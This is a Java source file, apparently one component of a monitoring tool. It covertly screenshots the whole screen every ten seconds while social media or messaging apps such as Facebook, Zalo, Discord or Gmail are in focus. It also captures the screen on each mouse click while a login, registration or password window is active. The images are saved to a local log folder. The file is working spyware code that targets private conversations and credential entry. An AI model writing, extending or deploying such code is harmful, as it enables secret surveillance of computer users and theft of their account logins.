import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.image.ImageObserver;
import java.awt.image.ImageProducer;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

class ScreenshotHandler {
    private static final String[] GROUP_A_WINDOWS = {"Zalo", "Facebook", "Instagram", "Discord", "Gmail"}; //Each 10s
    private static final String[] GROUP_B_WINDOWS = {"Đăng ký", "Đăng nhập", "Register", "Log in", "Sign in",
            "Mật khẩu", "Tài khoản", "User", "Người dùng"}; //Click Events

    public static void startMonitoring() {
        monitorGroupAWindows();
        monitorMouseClickEventsForGroupB();
    }

    private static void monitorGroupAWindows() {
        new Thread(() -> {
            while (true) {
                try {
                    for (String app : GROUP_A_WINDOWS) {
                        if (WindowMonitor.currentWindow.contains(app)) {
                            captureScreenshot(WindowMonitor.currentWindow);
                            break;
                        }
                    }
                    Thread.sleep(10000); // 10s
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private static void monitorMouseClickEventsForGroupB() {
        GlobalScreen.addNativeMouseListener(new NativeMouseListener() {
            @Override
            public void nativeMouseClicked(NativeMouseEvent e) {
                for (String app : GROUP_B_WINDOWS) {
                    if (WindowMonitor.currentWindow.contains(app)) {
                        captureScreenshot(WindowMonitor.currentWindow);
                        break;
                    }
                }
            }
            @Override
            public void nativeMousePressed(NativeMouseEvent e) {}
            @Override
            public void nativeMouseReleased(NativeMouseEvent e) {}
        });
    }

    public static void captureScreenshot(String windowTitle) {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);


            // Giảm độ phân giải
            int reducedWidth = screenRect.width;
            int reducedHeight = screenRect.height;
            BufferedImage resizedImage = new BufferedImage(reducedWidth, reducedHeight, BufferedImage.TYPE_INT_RGB);
            Graphics2D g2d = resizedImage.createGraphics();
            g2d.drawImage(screenFullImage, 0, 0, reducedWidth, reducedHeight, null);
            g2d.dispose();

            // Lưu ảnh với tên file theo cú pháp
            String timestamp = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss").format(new Date());
            String fileName = windowTitle.replaceAll("[\\\\/:*?\"<>|]", "_") + "_" + timestamp + ".jpg";
            File outputDir = new File(LogFileHandler.LOG_FOLDER_PATH);
            if (!outputDir.exists()) {
                outputDir.mkdirs();
            }
            File outputFile = new File(outputDir, fileName);

            // Nén ảnh JPEG
            ImageIO.write(resizedImage, "jpg", outputFile);

        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }
}
